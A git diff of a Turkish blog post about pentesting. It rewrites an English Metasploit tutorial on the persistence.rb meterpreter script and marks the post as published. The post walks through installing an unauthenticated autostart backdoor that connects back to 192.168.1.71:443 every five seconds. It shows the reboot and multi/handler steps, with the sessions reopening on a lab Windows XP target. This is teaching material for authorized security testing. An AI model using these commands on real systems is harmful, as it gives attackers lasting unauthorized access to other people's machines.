@@ -5,7 +5,7 @@ date: 2017-06-15 09:02:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -13,25 +13,23 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework timestomp
-- msf meterpreter timestomp
+- Metasploit Framework persistence
+- msf meterpreter persistence.rb
 
-excerpt: Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir. Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız izleri incelemek **forensics** araştırmacılarının dikkatini çeker. Dosyaların zaman damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından karıştırmak için Meterpreter ```timestomp``` adı verilen bir komut sağlamaktadır.
+excerpt: Hedef sistemde oturum açtıktan sonra kalıcılık sağlamak için Metasploit Framework içinde kullanabileceğiniz bir diğer yöntem de persistence.rb script kodunu kullanmaktır.
 ---
 
-Persistent Backdoors
-Maintaining access is a very important phase of penetration testing, unfortunately, it is one that is often overlooked. Most penetration testers get carried away whenever administrative access is obtained, so if the system is later patched, then they no longer have access to it.
+# Persistence.rb
 
-Persistent backdoors help us access a system we have successfully compromised in the past. It is important to note that they may be out of scope during a penetration test; however, being familiar with them is of paramount importance. Let us look at a few persistent backdoors now!
+Hedef sistemde oturum açtıktan sonra kalıcılık sağlamak için Metasploit Framework içinde kullanabileceğiniz bir diğer yöntem de ```persistence.rb``` script kodunu kullanmaktır.
 
-Understanding the Metasploit Meterpreter
+Bu yöntem sayesinde, hedef bilgisayar güncellense bile tekrar bağlanma imkanınız bulunmaktadır. Ayrıca, hedef sistemin tekrar başlatılması da bağlantı yapmayı etkilemeyecektir.
 
-After going through all the hard work of exploiting a system, it’s often a good idea to leave yourself an easier way back into the system for later use. This way, if the service you initially exploited is down or patched, you can still gain access to the system. Metasploit has a Meterpreter script, persistence.rb, that will create a Meterpreter service that will be available to you even if the remote system is rebooted.
+Bir önceki konuda, ```metsvc``` için yaptığımız uyarıyı burada da tekrarlayalım. ```persistence.rb``` arka kapısı, bağlantı için herhangi bir oturum bilgisi kullanmaz. Bu açıklığı keşfeden herkes bağlantı sağlayabilir.
 
-One word of warning here before we go any further. The persistent Meterpreter as shown here requires no authentication. This means that anyone that gains access to the port could access your back door! This is not a good thing if you are conducting a penetration test, as this could be a significant risk. In a real world situation, be sure to exercise the utmost caution and be sure to clean up after yourself when the engagement is done.
+Hedef sistemde meterpreter oturum açtıktan sonra ```persistence.rb``` script kodunu kullanmadan önce yardım bilgilerini görüntüleyelim ve bize hangi imkanları sağladığını görelim.
 
-Once we’ve initially exploited the host, we run the persistence script with the ‘-h’ switch to see which options are available:
-
+```sh
 meterpreter > run persistence -h
 
 [!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
@@ -40,19 +38,32 @@ Meterpreter Script for creating a persistent backdoor on a target host.
 
 OPTIONS:
 
-    -A        Automatically start a matching exploit/multi/handler to connect to the agent
+    -A   Automatically start a matching exploit/multi/handler to connect to the agent
     -L   Location in target host to write payload to, if none %TEMP% will be used.
     -P   Payload to use, default is windows/meterpreter/reverse_tcp.
-    -S        Automatically start the agent on boot as a service (with SYSTEM privileges)
+    -S   Automatically start the agent on boot as a service (with SYSTEM privileges)
     -T   Alternate executable template to use
-    -U        Automatically start the agent when the User logs on
-    -X        Automatically start the agent when the system boots
-    -h        This help menu
+    -U   Automatically start the agent when the User logs on
+    -X   Automatically start the agent when the system boots
+    -h   This help menu
     -i   The interval in seconds between each connection attempt
     -p   The port on which the system running Metasploit is listening
     -r   The IP of the system running Metasploit listening for the connect back
-We will configure our persistent Meterpreter session to wait until a user logs on to the remote system and try to connect back to our listener every 5 seconds at IP address 192.168.1.71 on port 443.
+```
 
+
+Aşağıdaki ```persistence -U -i 5 -p 443 -r 192.168.1.71``` komutu hangi işlemleri yapıyor? 
+
+```-U```, bir kullanıcı oturum açtığında bizim bilgisayarımıza otomatik bağlantı yapılmasını sağlar. 
+
+```-i 5``` Karşe taraftaki ```persistence.rb``` script kodu her 5 saniyede bir bize bağlanmaya çalışır. 
+
+```-p 443``` bizim dinleme yapan bilgisayarımızın dinleme yaptığı port numarasıdır. 
+
+```-r 192.168.1.71``` bizim dinleme yapan bilgisayarımızın IP numarasıdır.
+
+
+```sh
 meterpreter > run persistence -U -i 5 -p 443 -r 192.168.1.71
 [*] Creating a persistent agent: LHOST=192.168.1.71 LPORT=443 (interval=5 onboot=true)
 [*] Persistent agent script is 613976 bytes long
@@ -62,13 +73,27 @@ meterpreter > run persistence -U -i 5 -p 443 -r 192.168.1.71
 [*] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
 [*] For cleanup use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
 meterpreter >
-Notice that the script output gives you the command to remove the persistent listener when you are done with it. Be sure to make note of it so you don’t leave an unauthenticated backdoor on the system. To verify that it works, we reboot the remote system and set up our payload handler.
+```
 
+Verdiğimiz komut sonucunda başlatılan script, çıktılarda da görüleceği gibi işimiz tamamlandığında log temizleme işleminin nasıl yapılabileceğini de gösteriyor.
+
+```sh
+multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
+```
+
+Scriptin çalışıp çalışmadığını ve otomatik bağlantı yapıp yapmadığını, hedef bilgisayarı tekrar başlatarak anlayabiliriz. Hedef bilgisayarı yeniden başlatalım.
+
+```sh
 meterpreter > reboot
 Rebooting...
 meterpreter > exit
 
 [*] Meterpreter session 3 closed.  Reason: User exit
+```
+
+Dinleyici ```exploit/multi/handler``` modülünü tekrar başlatalım.
+
+```sh
 msf exploit(ms08_067_netapi) > use exploit/multi/handler
 msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
 PAYLOAD => windows/meterpreter/reverse_tcp
@@ -80,8 +105,11 @@ msf exploit(handler) > exploit
 
 [*] Started reverse handler on 192.168.1.71:443
 [*] Starting the payload handler...
-When a user logs in to the remote system, a Meterpreter session is opened up for us.
+```
 
+Hedef bilgisayar tekrar başladığında, oturum açılır açılmaz yerel bilgisayara bağlantı, aşağıda görüldüğü gibi tekrar sağlanacaktır.
+
+```sh
 [*] Sending stage (748544 bytes) to 192.168.1.161
 [*] Meterpreter session 5 opened (192.168.1.71:443 -> 192.168.1.161:1045) at 2010-08-21 12:31:42 -0600
 
@@ -91,3 +119,5 @@ OS      : Windows XP (Build 2600, Service Pack 2).
 Arch    : x86
 Language: en_US
 meterpreter >
+```
+
